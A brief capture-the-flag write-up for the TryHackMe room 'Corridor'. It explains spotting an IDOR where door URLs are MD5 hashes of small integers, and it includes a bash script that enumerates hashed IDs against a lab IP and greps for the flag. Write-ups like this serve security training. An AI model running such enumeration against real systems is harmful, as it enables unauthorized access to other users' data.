## Corridor (TryHackMe Easy)

For this room, I first observed the webserver and found out that if you clicked on a door, it took you to a URL with a 32-character MD5 hash, signifying the door. I noticed this was a IDOR (Insecure Direct Object Reference) vulnerability and immediately starting thinking what the md5sums could be hashes of. After I realized that they were hashes of simple integers, I created a bash script to check URLS for md5sum hashes of numbers from 0-50 for the flag. If any grepped true for the flag, I outputted it to the terminal. 

Here is the bash script for reference:

```for i in $(seq 0 50); do 
    h=$(echo -n "$i" | md5sum | cut -d' ' -f1) 
    if curl -s "http://10.65.179.203/$h" | grep -q 'flag{'; then 
        echo "True $h" 
        exit 0 
    fi 
done 
echo "False" 
exit 1```